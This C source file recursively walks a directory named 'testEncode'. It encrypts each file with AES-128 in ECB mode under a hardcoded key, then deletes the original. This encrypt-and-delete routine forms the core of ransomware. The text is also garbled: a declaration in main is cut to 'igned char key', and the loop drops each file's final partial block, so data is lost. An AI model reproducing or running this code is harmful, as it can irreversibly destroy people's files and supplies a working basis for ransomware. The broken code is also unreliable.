#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <dirent.h>
#include <openssl/aes.h>

#define AES_BLOCK_SIZE 16

void encryptFile(const char* inputFile, const char* outputFile, const unsigned char* key) {
    FILE *inFile = fopen(inputFile, "rb");
    FILE *outFile = fopen(outputFile, "wb");

    unsigned char inBlock[AES_BLOCK_SIZE];
    unsigned char outBlock[AES_BLOCK_SIZE];

    AES_KEY aesKey;
    AES_set_encrypt_key(key, 128, &aesKey);

    while (fread(inBlock, 1, AES_BLOCK_SIZE, inFile) == AES_BLOCK_SIZE) {
        AES_encrypt(inBlock, outBlock, &aesKey);
        fwrite(outBlock, 1, AES_BLOCK_SIZE, outFile);
    }

    fclose(inFile);
    fclose(outFile);
}

void encryptDirectory(const char* directoryPath, const unsigned char* key) {
    struct dirent *entry;
    DIR *dir = opendir(directoryPath);
    if (dir == NULL) {
        printf("Error open folder %s.\n", directoryPath);
        return;
    }

    while ((entry = readdir(dir)) != NULL) {
        if (entry->d_type == DT_REG) {
            char filePath[256];
            sprintf(filePath, "%s/%s", directoryPath, entry->d_name);

            char outputFilePath[256];
            sprintf(outputFilePath, "%s/%s_encrypted", directoryPath, entry->d_name);

            encryptFile(filePath, outputFilePath, key);

            printf("File %s encoded.\n", entry->d_name);
            remove(filePath);
            printf("Original file %s deleted.\n", entry->d_name);
        } else if (entry->d_type == DT_DIR && strcmp(entry->d_name, ".") != 0 && strcmp(entry->d_name, "..") != 0) {
            char subDirPath[256];
            sprintf(subDirPath, "%s/%s", directoryPath, entry->d_name);
            encryptDirectory(subDirPath, key);
        }
    }

    closedir(dir);
}

int main() {
    const char* directoryPath = "testEncode";igned char key[AES_BLOCK_SIZE] = "mysecretpassword";   encryptDirectory(directoryPath, key);

    return 0;
}
